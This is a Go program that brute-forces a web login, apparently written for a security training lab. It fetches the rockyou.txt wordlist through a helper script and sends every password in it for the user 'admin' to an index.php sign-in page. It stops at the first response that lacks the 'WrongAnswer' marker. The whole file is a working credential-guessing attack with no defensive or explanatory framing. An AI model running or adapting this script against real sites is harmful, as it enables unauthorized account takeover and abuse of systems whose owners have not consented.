package main

import (
	"bufio"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/net/html"
)

func getPage(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	sb := string(body)
	return sb, nil
}

func parse(text string) (data string) {
	tkn := html.NewTokenizer(strings.NewReader(text))

	for {
		tt := tkn.Next()
		switch {

		case tt == html.StartTagToken:

			t := tkn.Token()
			if t.Data == "img" {
				return t.String()
			}
		}
	}
}

func fileNotExists(fileName string) bool {
	_, error := os.Stat(fileName)

	// check if error is "file not exists"
	return os.IsNotExist(error)
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("[-] Please provide a host")
	}
	var baseUrl = ""

	// check if host have http or https
	if os.Args[1][:4] != "http" && os.Args[1][:5] != "https" {
		baseUrl = "http://" + os.Args[1]
	} else {
		baseUrl = os.Args[1]
	}

	file := "rockyou.txt"

	if fileNotExists(file) {
		log.Printf("[+] Dictinary %s does not exist", file)
		log.Printf("[+] Download dictonnary.....")
		cmd := exec.Command("/bin/sh", "download_dict.sh")
		_, err := cmd.Output()

		if err != nil {
			log.Println(err.Error())
			return
		}

		// Print the output
		log.Printf("[+] File downloaded")
	}

	log.Printf("[+] Open dictonnary")
	rockyou, err := os.Open(file)

	if err != nil {
		log.Fatal(err)
	}
	fileScanner := bufio.NewScanner(rockyou)

	fileScanner.Split(bufio.ScanLines)

	log.Printf("[+] Start bruteforce on %s", baseUrl)
	for fileScanner.Scan() {
		passwordCandidate := fileScanner.Text()

		var url = baseUrl + "/index.php?page=signin&username=admin&password=" + passwordCandidate + "&Login=Login#"
		ret, err := getPage(url)
		if err != nil {
			log.Fatal(err)
		}
		parsedRet := parse(ret)
		if !strings.Contains(parsedRet, "WrongAnswer") {
			log.Printf("[+] Win : %s", passwordCandidate)
			break
		}
	}
	rockyou.Close()
}
